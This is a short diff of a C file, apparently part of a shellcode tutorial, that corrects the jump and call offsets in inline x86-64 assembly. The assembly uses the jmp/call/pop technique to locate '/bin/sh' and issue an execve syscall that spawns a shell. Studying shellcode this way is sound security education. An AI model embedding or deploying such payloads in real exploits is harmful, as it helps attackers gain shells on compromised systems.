@@ -12,7 +12,7 @@ That's where the next stage, sc_stckex.c comes in...
 
 int main() {
     asm volatile(
-        "jmp . + 41\n\t"
+        "jmp . + 40\n\t"
         "pop %rbp\n\t"
         "mov %rbp,0x8(%rbp)\n\t"
         "mov $0x0,0x10(%rbp)\n\t"
@@ -22,9 +22,8 @@ int main() {
         "mov 0x8(%rbp),%rdi\n\t"
         "syscall\n\t"
         "mov $0x0,%eax\n\t"
-        "pop %rbp\n\t"
         "ret\n\t"
-        "call . - 39\n\t"
+        "call . - 38\n\t"
         ".string \"/bin/sh\""
     );
 }
